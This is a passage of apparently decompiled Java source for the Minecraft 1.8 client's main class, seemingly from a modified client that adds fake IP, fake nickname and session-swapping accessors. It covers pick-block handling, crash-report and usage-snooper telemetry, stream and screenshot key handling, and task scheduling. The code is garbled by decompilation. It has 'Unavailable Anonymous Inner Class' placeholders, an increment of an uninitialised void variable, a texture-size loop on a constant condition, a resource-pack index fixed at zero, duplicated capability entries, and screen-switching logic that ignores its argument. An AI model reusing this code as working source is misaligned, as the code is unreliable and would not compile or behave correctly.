                int n = block.getDamageValue((World)theWorld, blockPos);
                boolean bl2 = item.getHasSubtypes();
            } else {
                if (this.objectMouseOver.typeOfHit != MovingObjectPosition.MovingObjectType.ENTITY || this.objectMouseOver.entityHit == null || !bl) {
                    return;
                }
                if (this.objectMouseOver.entityHit instanceof EntityPainting) {
                    item = Items.painting;
                } else if (this.objectMouseOver.entityHit instanceof EntityLeashKnot) {
                    item = Items.lead;
                } else if (this.objectMouseOver.entityHit instanceof EntityItemFrame) {
                    blockPos = (EntityItemFrame)this.objectMouseOver.entityHit;
                    block2 = blockPos.getDisplayedItem();
                    if (block2 == null) {
                        item = Items.item_frame;
                    } else {
                        item = block2.getItem();
                        int n = block2.getMetadata();
                    }
                } else if (this.objectMouseOver.entityHit instanceof EntityMinecart) {
                    blockPos = (EntityMinecart)this.objectMouseOver.entityHit;
                    switch (SwitchEnumMinecartType.field_178901_b[blockPos.func_180456_s().ordinal()]) {
                        case 1: {
                            item = Items.furnace_minecart;
                            break;
                        }
                        case 2: {
                            item = Items.chest_minecart;
                            break;
                        }
                        case 3: {
                            item = Items.tnt_minecart;
                            break;
                        }
                        case 4: {
                            item = Items.hopper_minecart;
                            break;
                        }
                        case 5: {
                            item = Items.command_block_minecart;
                            break;
                        }
                        default: {
                            item = Items.minecart;
                            break;
                        }
                    }
                } else if (this.objectMouseOver.entityHit instanceof EntityBoat) {
                    item = Items.boat;
                } else if (this.objectMouseOver.entityHit instanceof EntityArmorStand) {
                    item = Items.armor_stand;
                } else {
                    item = Items.spawn_egg;
                    int n = EntityList.getEntityID((Entity)this.objectMouseOver.entityHit);
                    if (!EntityList.entityEggs.containsKey((Object)0)) {
                        return;
                    }
                }
            }
            blockPos = Minecraft.thePlayer.inventory;
            if (tileEntity == null) {
                blockPos.setCurrentItem(item, 0, true, bl);
            } else {
                block2 = new NBTTagCompound();
                tileEntity.writeToNBT((NBTTagCompound)block2);
                block = new ItemStack(item, 1, 0);
                block.setTagInfo("BlockEntityTag", (NBTBase)block2);
                NBTTagCompound nBTTagCompound = new NBTTagCompound();
                NBTTagList nBTTagList = new NBTTagList();
                nBTTagList.appendTag((NBTBase)new NBTTagString("(+NBT)"));
                nBTTagCompound.setTag("Lore", (NBTBase)nBTTagList);
                block.setTagInfo("display", (NBTBase)nBTTagCompound);
                blockPos.setInventorySlotContents(blockPos.currentItem, (ItemStack)block);
            }
            if (bl) {
                int n = Minecraft.thePlayer.inventoryContainer.inventorySlots.size() - 9 + blockPos.currentItem;
                playerController.sendSlotPacket(blockPos.getStackInSlot(blockPos.currentItem), n);
            }
        }
    }

    public CrashReport addGraphicsAndWorldToCrashReport(CrashReport crashReport) {
        crashReport.getCategory().addCrashSectionCallable("Launched Version", (Callable)new /* Unavailable Anonymous Inner Class!! */);
        crashReport.getCategory().addCrashSectionCallable("LWJGL", (Callable)new /* Unavailable Anonymous Inner Class!! */);
        crashReport.getCategory().addCrashSectionCallable("OpenGL", (Callable)new /* Unavailable Anonymous Inner Class!! */);
        crashReport.getCategory().addCrashSectionCallable("GL Caps", (Callable)new /* Unavailable Anonymous Inner Class!! */);
        crashReport.getCategory().addCrashSectionCallable("Using VBOs", (Callable)new /* Unavailable Anonymous Inner Class!! */);
        crashReport.getCategory().addCrashSectionCallable("Is Modded", (Callable)new /* Unavailable Anonymous Inner Class!! */);
        crashReport.getCategory().addCrashSectionCallable("Type", (Callable)new /* Unavailable Anonymous Inner Class!! */);
        crashReport.getCategory().addCrashSectionCallable("Resource Packs", (Callable)new /* Unavailable Anonymous Inner Class!! */);
        crashReport.getCategory().addCrashSectionCallable("Current Language", (Callable)new /* Unavailable Anonymous Inner Class!! */);
        crashReport.getCategory().addCrashSectionCallable("Profiler Position", (Callable)new /* Unavailable Anonymous Inner Class!! */);
        if (theWorld != null) {
            theWorld.addWorldInfoToCrashReport(crashReport);
        }
        return crashReport;
    }

    public static Minecraft getMinecraft() {
        return theMinecraft;
    }

    public ListenableFuture func_175603_A() {
        return this.addScheduledTask((Runnable)new /* Unavailable Anonymous Inner Class!! */);
    }

    /*
     * WARNING - void declaration
     */
    public void addServerStatsToSnooper(PlayerUsageSnooper playerUsageSnooper) {
        playerUsageSnooper.addClientStat("fps", (Object)debugFPS);
        playerUsageSnooper.addClientStat("vsync_enabled", (Object)this.gameSettings.enableVsync);
        playerUsageSnooper.addClientStat("display_frequency", (Object)Display.getDisplayMode().getFrequency());
        playerUsageSnooper.addClientStat("display_type", (Object)(this.fullscreen ? "fullscreen" : "windowed"));
        playerUsageSnooper.addClientStat("run_time", (Object)((MinecraftServer.getCurrentTimeMillis() - playerUsageSnooper.getMinecraftStartTimeMillis()) / 60L * 1000L));
        String string = ByteOrder.nativeOrder() == ByteOrder.LITTLE_ENDIAN ? "little" : "big";
        playerUsageSnooper.addClientStat("endianness", (Object)string);
        playerUsageSnooper.addClientStat("resource_packs", (Object)this.mcResourcePackRepository.getRepositoryEntries().size());
        for (ResourcePackRepository.Entry entry : this.mcResourcePackRepository.getRepositoryEntries()) {
            void var3_4;
            ++var3_4;
            playerUsageSnooper.addClientStat("resource_pack[" + 0 + "]", (Object)entry.getResourcePackName());
        }
        if (this.theIntegratedServer != null && this.theIntegratedServer.getPlayerUsageSnooper() != null) {
            playerUsageSnooper.addClientStat("snooper_partner", (Object)this.theIntegratedServer.getPlayerUsageSnooper().getUniqueID());
        }
    }

    public void addServerTypeToSnooper(PlayerUsageSnooper playerUsageSnooper) {
        playerUsageSnooper.addStatToSnooper("opengl_version", (Object)GL11.glGetString((int)7938));
        playerUsageSnooper.addStatToSnooper("opengl_vendor", (Object)GL11.glGetString((int)7936));
        playerUsageSnooper.addStatToSnooper("client_brand", (Object)ClientBrandRetriever.getClientModName());
        playerUsageSnooper.addStatToSnooper("launched_version", (Object)this.launchedVersion);
        ContextCapabilities contextCapabilities = GLContext.getCapabilities();
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_arrays_of_arrays]", (Object)contextCapabilities.GL_ARB_arrays_of_arrays);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_base_instance]", (Object)contextCapabilities.GL_ARB_base_instance);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_blend_func_extended]", (Object)contextCapabilities.GL_ARB_blend_func_extended);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_clear_buffer_object]", (Object)contextCapabilities.GL_ARB_clear_buffer_object);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_color_buffer_float]", (Object)contextCapabilities.GL_ARB_color_buffer_float);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_compatibility]", (Object)contextCapabilities.GL_ARB_compatibility);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_compressed_texture_pixel_storage]", (Object)contextCapabilities.GL_ARB_compressed_texture_pixel_storage);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_compute_shader]", (Object)contextCapabilities.GL_ARB_compute_shader);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_copy_buffer]", (Object)contextCapabilities.GL_ARB_copy_buffer);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_copy_image]", (Object)contextCapabilities.GL_ARB_copy_image);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_depth_buffer_float]", (Object)contextCapabilities.GL_ARB_depth_buffer_float);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_compute_shader]", (Object)contextCapabilities.GL_ARB_compute_shader);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_copy_buffer]", (Object)contextCapabilities.GL_ARB_copy_buffer);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_copy_image]", (Object)contextCapabilities.GL_ARB_copy_image);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_depth_buffer_float]", (Object)contextCapabilities.GL_ARB_depth_buffer_float);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_depth_clamp]", (Object)contextCapabilities.GL_ARB_depth_clamp);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_depth_texture]", (Object)contextCapabilities.GL_ARB_depth_texture);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_draw_buffers]", (Object)contextCapabilities.GL_ARB_draw_buffers);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_draw_buffers_blend]", (Object)contextCapabilities.GL_ARB_draw_buffers_blend);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_draw_elements_base_vertex]", (Object)contextCapabilities.GL_ARB_draw_elements_base_vertex);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_draw_indirect]", (Object)contextCapabilities.GL_ARB_draw_indirect);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_draw_instanced]", (Object)contextCapabilities.GL_ARB_draw_instanced);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_explicit_attrib_location]", (Object)contextCapabilities.GL_ARB_explicit_attrib_location);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_explicit_uniform_location]", (Object)contextCapabilities.GL_ARB_explicit_uniform_location);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_fragment_layer_viewport]", (Object)contextCapabilities.GL_ARB_fragment_layer_viewport);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_fragment_program]", (Object)contextCapabilities.GL_ARB_fragment_program);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_fragment_shader]", (Object)contextCapabilities.GL_ARB_fragment_shader);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_fragment_program_shadow]", (Object)contextCapabilities.GL_ARB_fragment_program_shadow);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_framebuffer_object]", (Object)contextCapabilities.GL_ARB_framebuffer_object);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_framebuffer_sRGB]", (Object)contextCapabilities.GL_ARB_framebuffer_sRGB);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_geometry_shader4]", (Object)contextCapabilities.GL_ARB_geometry_shader4);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_gpu_shader5]", (Object)contextCapabilities.GL_ARB_gpu_shader5);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_half_float_pixel]", (Object)contextCapabilities.GL_ARB_half_float_pixel);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_half_float_vertex]", (Object)contextCapabilities.GL_ARB_half_float_vertex);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_instanced_arrays]", (Object)contextCapabilities.GL_ARB_instanced_arrays);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_map_buffer_alignment]", (Object)contextCapabilities.GL_ARB_map_buffer_alignment);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_map_buffer_range]", (Object)contextCapabilities.GL_ARB_map_buffer_range);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_multisample]", (Object)contextCapabilities.GL_ARB_multisample);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_multitexture]", (Object)contextCapabilities.GL_ARB_multitexture);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_occlusion_query2]", (Object)contextCapabilities.GL_ARB_occlusion_query2);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_pixel_buffer_object]", (Object)contextCapabilities.GL_ARB_pixel_buffer_object);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_seamless_cube_map]", (Object)contextCapabilities.GL_ARB_seamless_cube_map);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_shader_objects]", (Object)contextCapabilities.GL_ARB_shader_objects);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_shader_stencil_export]", (Object)contextCapabilities.GL_ARB_shader_stencil_export);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_shader_texture_lod]", (Object)contextCapabilities.GL_ARB_shader_texture_lod);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_shadow]", (Object)contextCapabilities.GL_ARB_shadow);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_shadow_ambient]", (Object)contextCapabilities.GL_ARB_shadow_ambient);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_stencil_texturing]", (Object)contextCapabilities.GL_ARB_stencil_texturing);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_sync]", (Object)contextCapabilities.GL_ARB_sync);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_tessellation_shader]", (Object)contextCapabilities.GL_ARB_tessellation_shader);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_texture_border_clamp]", (Object)contextCapabilities.GL_ARB_texture_border_clamp);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_texture_buffer_object]", (Object)contextCapabilities.GL_ARB_texture_buffer_object);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_texture_cube_map]", (Object)contextCapabilities.GL_ARB_texture_cube_map);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_texture_cube_map_array]", (Object)contextCapabilities.GL_ARB_texture_cube_map_array);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_texture_non_power_of_two]", (Object)contextCapabilities.GL_ARB_texture_non_power_of_two);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_uniform_buffer_object]", (Object)contextCapabilities.GL_ARB_uniform_buffer_object);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_vertex_blend]", (Object)contextCapabilities.GL_ARB_vertex_blend);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_vertex_buffer_object]", (Object)contextCapabilities.GL_ARB_vertex_buffer_object);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_vertex_program]", (Object)contextCapabilities.GL_ARB_vertex_program);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_vertex_shader]", (Object)contextCapabilities.GL_ARB_vertex_shader);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_bindable_uniform]", (Object)contextCapabilities.GL_EXT_bindable_uniform);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_blend_equation_separate]", (Object)contextCapabilities.GL_EXT_blend_equation_separate);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_blend_func_separate]", (Object)contextCapabilities.GL_EXT_blend_func_separate);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_blend_minmax]", (Object)contextCapabilities.GL_EXT_blend_minmax);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_blend_subtract]", (Object)contextCapabilities.GL_EXT_blend_subtract);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_draw_instanced]", (Object)contextCapabilities.GL_EXT_draw_instanced);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_framebuffer_multisample]", (Object)contextCapabilities.GL_EXT_framebuffer_multisample);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_framebuffer_object]", (Object)contextCapabilities.GL_EXT_framebuffer_object);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_framebuffer_sRGB]", (Object)contextCapabilities.GL_EXT_framebuffer_sRGB);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_geometry_shader4]", (Object)contextCapabilities.GL_EXT_geometry_shader4);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_gpu_program_parameters]", (Object)contextCapabilities.GL_EXT_gpu_program_parameters);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_gpu_shader4]", (Object)contextCapabilities.GL_EXT_gpu_shader4);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_multi_draw_arrays]", (Object)contextCapabilities.GL_EXT_multi_draw_arrays);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_packed_depth_stencil]", (Object)contextCapabilities.GL_EXT_packed_depth_stencil);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_paletted_texture]", (Object)contextCapabilities.GL_EXT_paletted_texture);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_rescale_normal]", (Object)contextCapabilities.GL_EXT_rescale_normal);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_separate_shader_objects]", (Object)contextCapabilities.GL_EXT_separate_shader_objects);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_shader_image_load_store]", (Object)contextCapabilities.GL_EXT_shader_image_load_store);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_shadow_funcs]", (Object)contextCapabilities.GL_EXT_shadow_funcs);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_shared_texture_palette]", (Object)contextCapabilities.GL_EXT_shared_texture_palette);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_stencil_clear_tag]", (Object)contextCapabilities.GL_EXT_stencil_clear_tag);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_stencil_two_side]", (Object)contextCapabilities.GL_EXT_stencil_two_side);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_stencil_wrap]", (Object)contextCapabilities.GL_EXT_stencil_wrap);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_texture_3d]", (Object)contextCapabilities.GL_EXT_texture_3d);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_texture_array]", (Object)contextCapabilities.GL_EXT_texture_array);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_texture_buffer_object]", (Object)contextCapabilities.GL_EXT_texture_buffer_object);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_texture_integer]", (Object)contextCapabilities.GL_EXT_texture_integer);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_texture_lod_bias]", (Object)contextCapabilities.GL_EXT_texture_lod_bias);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_texture_sRGB]", (Object)contextCapabilities.GL_EXT_texture_sRGB);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_vertex_shader]", (Object)contextCapabilities.GL_EXT_vertex_shader);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_vertex_weighting]", (Object)contextCapabilities.GL_EXT_vertex_weighting);
        playerUsageSnooper.addStatToSnooper("gl_caps[gl_max_vertex_uniforms]", (Object)GL11.glGetInteger((int)35658));
        GL11.glGetError();
        playerUsageSnooper.addStatToSnooper("gl_caps[gl_max_fragment_uniforms]", (Object)GL11.glGetInteger((int)35657));
        GL11.glGetError();
        playerUsageSnooper.addStatToSnooper("gl_caps[gl_max_vertex_attribs]", (Object)GL11.glGetInteger((int)34921));
        GL11.glGetError();
        playerUsageSnooper.addStatToSnooper("gl_caps[gl_max_vertex_texture_image_units]", (Object)GL11.glGetInteger((int)35660));
        GL11.glGetError();
        playerUsageSnooper.addStatToSnooper("gl_caps[gl_max_texture_image_units]", (Object)GL11.glGetInteger((int)34930));
        GL11.glGetError();
        playerUsageSnooper.addStatToSnooper("gl_caps[gl_max_texture_image_units]", (Object)GL11.glGetInteger((int)35071));
        GL11.glGetError();
        playerUsageSnooper.addStatToSnooper("gl_max_texture_size", (Object)Minecraft.getGLMaximumTextureSize());
    }

    public static int getGLMaximumTextureSize() {
        while (16384 > 0) {
            GL11.glTexImage2D((int)32868, (int)0, (int)6408, (int)16384, (int)16384, (int)0, (int)6408, (int)5121, null);
            int n = GL11.glGetTexLevelParameteri((int)32868, (int)0, (int)4096);
            if (n == 0) continue;
            return 16384;
        }
        return -1;
    }

    public boolean isSnooperEnabled() {
        return this.gameSettings.snooperEnabled;
    }

    public void setServerData(ServerData serverData) {
        this.currentServerData = serverData;
    }

    public ServerData getCurrentServerData() {
        return this.currentServerData;
    }

    public boolean isIntegratedServerRunning() {
        return this.integratedServerIsRunning;
    }

    public boolean isSingleplayer() {
        return this.integratedServerIsRunning && this.theIntegratedServer != null;
    }

    public IntegratedServer getIntegratedServer() {
        return this.theIntegratedServer;
    }

    public static void stopIntegratedServer() {
        IntegratedServer integratedServer;
        if (theMinecraft != null && (integratedServer = theMinecraft.getIntegratedServer()) != null) {
            integratedServer.stopServer();
        }
    }

    public PlayerUsageSnooper getPlayerUsageSnooper() {
        return this.usageSnooper;
    }

    public static long getSystemTime() {
        return Sys.getTime() * 1000L / Sys.getTimerResolution();
    }

    public boolean isFullScreen() {
        return this.fullscreen;
    }

    public static Session getSession() {
        return session;
    }

    public PropertyMap func_180509_L() {
        return this.twitchDetails;
    }

    public Proxy getProxy() {
        return this.proxy;
    }

    public TextureManager getTextureManager() {
        return this.renderEngine;
    }

    public IResourceManager getResourceManager() {
        return this.mcResourceManager;
    }

    public ResourcePackRepository getResourcePackRepository() {
        return this.mcResourcePackRepository;
    }

    public LanguageManager getLanguageManager() {
        return this.mcLanguageManager;
    }

    public TextureMap getTextureMapBlocks() {
        return this.textureMapBlocks;
    }

    public boolean isJava64bit() {
        return this.jvm64bit;
    }

    public boolean isGamePaused() {
        return this.isGamePaused;
    }

    public static SoundHandler getSoundHandler() {
        return mcSoundHandler;
    }

    public MusicTicker.MusicType getAmbientMusicType() {
        return this.currentScreen instanceof GuiWinGame ? MusicTicker.MusicType.CREDITS : (thePlayer != null ? (Minecraft.thePlayer.worldObj.provider instanceof WorldProviderHell ? MusicTicker.MusicType.NETHER : (Minecraft.thePlayer.worldObj.provider instanceof WorldProviderEnd ? (BossStatus.bossName != null && BossStatus.statusBarTime > 0 ? MusicTicker.MusicType.END_BOSS : MusicTicker.MusicType.END) : (Minecraft.thePlayer.capabilities.isCreativeMode && Minecraft.thePlayer.capabilities.allowFlying ? MusicTicker.MusicType.CREATIVE : MusicTicker.MusicType.GAME))) : MusicTicker.MusicType.MENU);
    }

    public IStream getTwitchStream() {
        return this.stream;
    }

    public void dispatchKeypresses() {
        int n;
        int n2 = n = Keyboard.getEventKey() == 0 ? Keyboard.getEventCharacter() : Keyboard.getEventKey();
        if (!(n == 0 || Keyboard.isRepeatEvent() || this.currentScreen instanceof GuiControls && ((GuiControls)this.currentScreen).time > Minecraft.getSystemTime() - 20L)) {
            if (Keyboard.getEventKeyState()) {
                if (n == this.gameSettings.keyBindStreamStartStop.getKeyCode()) {
                    if (this.getTwitchStream().func_152934_n()) {
                        this.getTwitchStream().func_152914_u();
                    } else if (this.getTwitchStream().func_152924_m()) {
                        this.displayGuiScreen((GuiScreen)new GuiYesNo((GuiYesNoCallback)new /* Unavailable Anonymous Inner Class!! */, I18n.format((String)"stream.confirm_start", (Object[])new Object[0]), "", 0));
                    } else if (this.getTwitchStream().func_152928_D() && this.getTwitchStream().func_152936_l()) {
                        if (theWorld != null) {
                            ingameGUI.getChatGUI().printChatMessage((IChatComponent)new ChatComponentText("Not ready to start streaming yet!"));
                        }
                    } else {
                        GuiStreamUnavailable.func_152321_a((GuiScreen)this.currentScreen);
                    }
                } else if (n == this.gameSettings.keyBindStreamPauseUnpause.getKeyCode()) {
                    if (this.getTwitchStream().func_152934_n()) {
                        if (this.getTwitchStream().isPaused()) {
                            this.getTwitchStream().func_152933_r();
                        } else {
                            this.getTwitchStream().func_152916_q();
                        }
                    }
                } else if (n == this.gameSettings.keyBindStreamCommercials.getKeyCode()) {
                    if (this.getTwitchStream().func_152934_n()) {
                        this.getTwitchStream().func_152931_p();
                    }
                } else if (n == this.gameSettings.keyBindStreamToggleMic.getKeyCode()) {
                    this.stream.func_152910_a(true);
                } else if (n == this.gameSettings.keyBindFullscreen.getKeyCode()) {
                    this.toggleFullscreen();
                } else if (n == this.gameSettings.keyBindScreenshot.getKeyCode()) {
                    ingameGUI.getChatGUI().printChatMessage(ScreenShotHelper.saveScreenshot((File)mcDataDir, (int)this.displayWidth, (int)this.displayHeight, (Framebuffer)this.framebufferMc));
                }
            } else if (n == this.gameSettings.keyBindStreamToggleMic.getKeyCode()) {
                this.stream.func_152910_a(false);
            }
        }
    }

    public MinecraftSessionService getSessionService() {
        return this.sessionService;
    }

    public SkinManager getSkinManager() {
        return this.skinManager;
    }

    public Entity func_175606_aa() {
        return this.field_175622_Z;
    }

    public void func_175607_a(Entity entity) {
        this.field_175622_Z = entity;
        this.entityRenderer.func_175066_a(entity);
    }

    public ListenableFuture addScheduledTask(Callable callable) {
        Validate.notNull((Object)callable);
        if (!this.isCallingFromMinecraftThread()) {
            ListenableFutureTask listenableFutureTask = ListenableFutureTask.create((Callable)callable);
            Queue queue = this.scheduledTasks;
            Queue queue2 = this.scheduledTasks;
            synchronized (queue2) {
                this.scheduledTasks.add((Object)listenableFutureTask);
                return listenableFutureTask;
            }
        }
        return Futures.immediateFuture((Object)callable.call());
    }

    public ListenableFuture addScheduledTask(Runnable runnable) {
        Validate.notNull((Object)runnable);
        return this.addScheduledTask(Executors.callable((Runnable)runnable));
    }

    public boolean isCallingFromMinecraftThread() {
        return Thread.currentThread() == this.mcThread;
    }

    public BlockRendererDispatcher getBlockRendererDispatcher() {
        return this.field_175618_aM;
    }

    public RenderManager getRenderManager() {
        return this.renderManager;
    }

    public RenderItem getRenderItem() {
        return this.renderItem;
    }

    public ItemRenderer getItemRenderer() {
        return this.itemRenderer;
    }

    public static int func_175610_ah() {
        return debugFPS;
    }

    public static Map func_175596_ai() {
        HashMap hashMap = Maps.newHashMap();
        Minecraft.getMinecraft();
        hashMap.put((Object)"X-Minecraft-Username", (Object)Minecraft.getSession().getUsername());
        Minecraft.getMinecraft();
        hashMap.put((Object)"X-Minecraft-UUID", (Object)Minecraft.getSession().getPlayerID());
        hashMap.put((Object)"X-Minecraft-Version", (Object)"1.8");
        return hashMap;
    }

    public boolean isConnectedToRealms() {
        return this.connectedToRealms;
    }

    public String getFakeIp() {
        return this.fakeIp;
    }

    public String getFakeNick() {
        return this.fakeNick;
    }

    public void setFakeIp(String string) {
        this.fakeIp = string;
    }

    public void setFakeNick(String string) {
        this.fakeNick = string;
    }

    public static Minecraft getInstance() {
        return theMinecraft;
    }

    public String getVersion() {
        return this.launchedVersion;
    }

    public void setSession(Session session) {
        Minecraft.session = session;
    }

    public Entity getRenderViewEntity() {
        return this.renderViewEntity;
    }

    public static World getWorld() {
        return theWorld;
    }

    public static EntityPlayerSP getPlayer() {
        return thePlayer;
    }

    public void openScreen(GuiScreen guiScreen) {
        GuiMainMenu guiMainMenu = null;
        GuiGameOver guiGameOver = null;
        if (this.currentScreen != null) {
            this.currentScreen.onGuiClosed();
        }
        if (guiScreen == null && theWorld == null) {
            guiMainMenu = new GuiMainMenu();
        } else if (guiMainMenu == null && thePlayer.getHealth() <= 0.0f) {
            guiGameOver = new GuiGameOver();
        }
        this.currentScreen = guiGameOver;
        if (guiGameOver != null) {
            this.setIngameNotInFocus();
            ScaledResolution scaledResolution = new ScaledResolution(this, this.displayWidth, this.displayHeight);
            int n = ScaledResolution.getScaledWidth();
            int n2 = ScaledResolution.getScaledHeight();
            guiGameOver.setWorldAndResolution(this, n, n2);
            this.skipRenderWorld = false;
        } else {
            mcSoundHandler.resumeSounds();
            this.setIngameFocus();
        }
    }

    public static int getDebugFPS() {
        return debugFPS;
    }

    static String access$0(Minecraft minecraft) {
        return minecraft.launchedVersion;
    }
}
